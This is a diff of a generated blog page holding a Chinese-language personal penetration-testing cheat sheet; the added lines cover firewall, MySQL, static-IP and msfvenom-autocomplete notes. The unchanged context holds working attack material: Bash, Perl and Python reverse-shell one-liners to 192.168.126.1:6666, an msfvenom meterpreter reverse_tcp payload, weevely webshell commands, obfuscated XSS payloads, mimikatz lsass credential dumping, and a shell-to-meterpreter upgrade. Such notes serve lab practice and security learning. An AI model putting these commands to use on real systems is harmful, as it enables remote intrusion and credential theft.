@@ -895,7 +895,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-07-18 17:34:37" itemprop="dateModified" datetime="2019-07-18T17:34:37+08:00">2019-07-18</time>
+                <time title="Modified: 2019-07-24 21:29:54" itemprop="dateModified" datetime="2019-07-24T21:29:54+08:00">2019-07-24</time>
               
             
           </span>
@@ -969,9 +969,14 @@
 <h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">useradd -d &quot;/home/chessur&quot; -m -s &quot;/bin/bash&quot; chessur</span><br><span class="line">//指定家目录</span><br><span class="line">//-m 若家目录不存在，则强制创建家目录</span><br><span class="line">//-s 指定shell</span><br></pre></td></tr></table></figure>
 <h2 id="ufw"><a href="#ufw" class="headerlink" title="ufw"></a>ufw</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ufw default deny //设置端口默认关闭</span><br><span class="line">ufw status //查看ufw状态</span><br><span class="line">ufw allow port //放行端口</span><br><span class="line">ufw enable //开启ufw</span><br></pre></td></tr></table></figure>
 <h2 id="单用户模式"><a href="#单用户模式" class="headerlink" title="单用户模式"></a>单用户模式</h2><p>开机选advanced，按e，找到<code>ro recovery nomodeset</code>，修改为<code>rw single init=/bin/bash</code> ，修改之后按F10或Ctrl+X进入单用户模式</p>
-<h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="更改secure-file-priv"><a href="#更改secure-file-priv" class="headerlink" title="更改secure_file_priv"></a>更改secure_file_priv</h3><p>没有my.ini，my.cnf里什么都没有，MySQL版本5.7.26</p>
+<p>将显示用base64编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat index.php | base64</span><br></pre></td></tr></table></figure>
+<h2 id="firewall"><a href="#firewall" class="headerlink" title="firewall"></a>firewall</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=80/tcp --permanent</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl start firewalld</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>
+<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h3 id="更改secure-file-priv"><a href="#更改secure-file-priv" class="headerlink" title="更改secure_file_priv"></a>更改secure_file_priv</h3><p>没有my.ini，my.cnf里什么都没有，MySQL版本5.7.26</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/mysql/my.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">secure_file_priv=&apos;&apos;</span><br></pre></td></tr></table></figure>
 <p>参考：<br><a href="https://serverfault.com/questions/820447/cant-set-secure-file-priv-on-mysql-5-7-ubuntu-16-04" target="_blank" rel="noopener">can’t set secure_file_priv on mysql 5.7 Ubuntu 16.04</a></p>
+<h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>5.0增加information_schema</p>
+<p>4.0支持union</p>
 <h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.126.1/6666 0&gt;&amp;1</span><br><span class="line">bash -i 5&lt;&gt;/dev/tcp/192.168.126.1/6666 0&gt;&amp;5 1&gt;&amp;5</span><br></pre></td></tr></table></figure>
 <h2 id="PERL"><a href="#PERL" class="headerlink" title="PERL"></a>PERL</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;use Socket;$i=&quot;192.168.126.1&quot;;$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure>
 <h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.126.1&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>
@@ -984,6 +989,9 @@
 <p>工具：<a href="https://github.com/peewpw/Invoke-PSImage" target="_blank" rel="noopener">https://github.com/peewpw/Invoke-PSImage</a></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.126.1 LPORT=6666 -f psh-reflection  -o /root/image_shell.ps1</span><br></pre></td></tr></table></figure>
 <h1 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h1><h2 id="weevely"><a href="#weevely" class="headerlink" title="weevely"></a>weevely</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weevely generate Windy /root/windy.php</span><br><span class="line">weevely terminal http://target.com/windy.php Windy</span><br></pre></td></tr></table></figure>
+<p>修改桥接静态IP</p>
+<p>1.VMware选择网卡<br>2.修改配置文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/network/interfaces</span><br><span class="line">auto eth0 </span><br><span class="line">#</span><br><span class="line">iface eth0 inet static</span><br><span class="line">address 192.168.126.126</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line">gateway 192.168.126.1s</span><br><span class="line">broadcast 192.168.126.255</span><br><span class="line">dns-nameservers 114.114.114.114</span><br></pre></td></tr></table></figure>
 <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#x0000000074:alert(1)</span><br></pre></td></tr></table></figure>
 <p><code>&amp;#x0000</code>空子节</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$=~[];$=&#123;___:++$,$$$$:(![]+&quot;&quot;)[$],__$:++$,$_$_:(![]+&quot;&quot;)[$],_$_:++$,$_$$:(&#123;&#125;+&quot;&quot;)[$],$$_$:($[$]+&quot;&quot;)[$],_$$:++$,$$$_:(!&quot;&quot;+&quot;&quot;)[$],$__:++$,$_$:++$,$$__:(&#123;&#125;+&quot;&quot;)[$],$$_:++$,$$$:++$,$___:++$,$__$:++$&#125;;$.$_=($.$_=$+&quot;&quot;)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+&quot;&quot;)[$.__$])+((!$)+&quot;&quot;)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!&quot;&quot;+&quot;&quot;)[$.__$])+($._=(!&quot;&quot;+&quot;&quot;)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!&quot;&quot;+&quot;&quot;)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+&quot;\&quot;&quot;+$.$_$_+(![]+&quot;&quot;)[$._$_]+$.$$$_+&quot;\\&quot;+$.__$+$.$$_+$._$_+$.__+&quot;(&quot;+$.__$+&quot;)&quot;+&quot;\&quot;&quot;)())()&lt;/script&gt;</span><br></pre></td></tr></table></figure>
@@ -1013,6 +1021,11 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks4a</span><br><span class="line">use auxiliary/server/socks5</span><br></pre></td></tr></table></figure>
 <p>msfvenom</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-e 编码</span><br><span class="line">-i 编码次数</span><br><span class="line">-a 指定位数 -a x86</span><br><span class="line">-platform 指定系统 --platform win</span><br></pre></td></tr></table></figure>
+<h2 id="msfvenom自动补全"><a href="#msfvenom自动补全" class="headerlink" title="msfvenom自动补全"></a>msfvenom自动补全</h2><p>1.安装zsh<br>2.新建<code>~/.oh-my-zsh/custom/plugins/msfvenom</code><br>3.将脚本放在上面的目录<br>4.编辑zsh配置文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.zshrc</span><br><span class="line">plugins=(msfvenom)</span><br></pre></td></tr></table></figure>
+<p>5.更新zsh<code>source ~/.zshrc</code></p>
+<p>command shell 升级 meterpreter shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ctrl + Z</span><br><span class="line">y</span><br><span class="line">sessions -u ID</span><br></pre></td></tr></table></figure>
 <h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><p>命令行导入数据库</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -pPassword databasename &lt; filedir</span><br></pre></td></tr></table></figure>
 <h1 id="后台拿Shell"><a href="#后台拿Shell" class="headerlink" title="后台拿Shell"></a>后台拿Shell</h1><p>修改模板代码</p>
@@ -1033,6 +1046,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure>
 <p>win10测试无法使用mimikatz查看，版本Build 17763<br>WinXP可以使用</p>
 <h1 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h1><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>at </p>
+<h1 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h1><p>块选择，Ctrl+V</p>
 
           
         
@@ -1647,7 +1661,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-07-18 09:01:57" itemprop="dateModified" datetime="2019-07-18T09:01:57+08:00">2019-07-18</time>
+                <time title="Modified: 2019-07-25 18:34:27" itemprop="dateModified" datetime="2019-07-25T18:34:27+08:00">2019-07-25</time>
               
             
           </span>
